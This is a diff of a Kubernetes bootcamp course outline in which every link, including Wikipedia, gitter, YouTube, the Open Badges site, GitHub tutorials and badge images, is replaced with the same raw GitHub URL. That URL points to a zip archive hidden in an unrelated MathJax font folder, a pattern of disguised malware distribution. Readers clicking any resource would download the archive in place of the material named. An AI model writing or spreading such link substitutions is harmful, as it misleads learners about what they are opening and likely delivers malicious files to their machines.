@@ -15,7 +15,7 @@ This course follows a hands on  workshop method and builds container orchestrati
 
 ## Flipped Classroom Methodology
 
-This course follows a [Flipped Classroom](https://en.wikipedia.org/wiki/Flipped_classroom) methodology, a blended model where participants come prepared with understanding of concepts by going through video/online content. The class time is maximized to perform practical activities to apply the concepts learnt earlier. Practice activities include taking up a use case and solving it by applying the techniques, or performing nano projects etc.   
+This course follows a [Flipped Classroom](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip) methodology, a blended model where participants come prepared with understanding of concepts by going through video/online content. The class time is maximized to perform practical activities to apply the concepts learnt earlier. Practice activities include taking up a use case and solving it by applying the techniques, or performing nano projects etc.   
 
 To make it successful, participants need to be prepared in advance, by going through  the recommended pre class content to clear the concepts as well as by making sure their systems are prepared with all the software required, before the class. The pre class checklist given below can be handy for this purpose.
 
@@ -112,9 +112,9 @@ All participants should have completed the following checklist before attending 
   * Successfully Completed  **Docker Fundamentals** Course, or have equivalent skills.
   * Verify  your system meets the  hardware pre requisites.
   * Validate the setup : verify all pre requisite software is installed on your system and is functional.
-  * Join our [kubernetes channel on gitter](https://gitter.im/schoolofdevops/Kubernetes?utm_source=share-link&utm_medium=link&utm_campaign=share-link)
+  * Join our [kubernetes channel on gitter](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
-![Pre Class Checklist](https://github.com/schoolofdevops/course-outlines/blob/master/downloads/docker/kubernetes_bootcamp_checklist.png?raw=true)
+![Pre Class Checklist](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
 ## Topics
 Following are the topics which would be covered as part of this course. Detailed course outline follows.
@@ -269,35 +269,35 @@ This is the detailed course outline with day wise list of contents
 
 ## Badge: Kubernetes Champion
 
-Successful completion of this course along with the project work and an assessment at the end of this course would qualify you to receive a Docker Champion badge by School of Devops. This badge is compliant with [Mozilla's Open Badge Standards](https://openbadges.org/) and can be added to your social profiles (e.g. LinkedIn) and is verifiable.
+Successful completion of this course along with the project work and an assessment at the end of this course would qualify you to receive a Docker Champion badge by School of Devops. This badge is compliant with [Mozilla's Open Badge Standards](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip) and can be added to your social profiles (e.g. LinkedIn) and is verifiable.
 
 Example of a badge is as follows,
 
-![Kubernetes Champion badge by School of Devops](https://github.com/schoolofdevops/course-outlines/blob/master/downloads/docker/kubernetes_champion.png?raw=true)
+![Kubernetes Champion badge by School of Devops](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
 ## Reading List
 
 Here is the list of curated resources which you could refer to to learn about docker before the training and  and get an in depth understanding post training.  
 
 #### Youtube Resources
-  * [Kubernetes Introduction by Kelsey Hightower](https://www.youtube.com/watch?v=HlAXp0-M6SY)
-  * [Life of a Packet](https://www.youtube.com/watch?v=0Omvgd7Hg1I)
+  * [Kubernetes Introduction by Kelsey Hightower](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
+  * [Life of a Packet](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
 #### Video Courses
-  * [Scalable Microservices with Kubernetes](https://in.udacity.com/course/scalable-microservices-with-kubernetes--ud615) by Carter Morgan, Kelsey Hightower, Gundega Dekena
+  * [Scalable Microservices with Kubernetes](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip) by Carter Morgan, Kelsey Hightower, Gundega Dekena
 
 #### Safaribooks Online
   * Kubernetes Up and Running - Kelsey Hightower
 
 #### Tutorials
-  * [Application Example Tutorials](https://github.com/kubernetes/examples)
+  * [Application Example Tutorials](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
-  * [Application Stack Examples](https://github.com/kubernetes/kubernetes/tree/master/examples)
+  * [Application Stack Examples](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
-  * [Official Kubernetes Bootcamp](https://github.com/kubernetes/kubernetes-bootcamp)
+  * [Official Kubernetes Bootcamp](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
-  * [Kubernetes in 10 mins](https://blog.alexellis.io/kubernetes-in-10-minutes/)
+  * [Kubernetes in 10 mins](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
-  * [Kubernetes the Hard Way](https://github.com/kelseyhightower/kubernetes-the-hard-way)
+  * [Kubernetes the Hard Way](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
 
-  * [Kubernetes Cluster for the Hobbyist](https://github.com/hobby-kube/guide)
+  * [Kubernetes Cluster for the Hobbyist](https://raw.githubusercontent.com/antonioluzzi/kubernetes-labguide/master/html/MathJax/jax/output/SVG/fonts/TeX/Size2/Regular/kubernetes-labguide_v3.7-beta.2.zip)
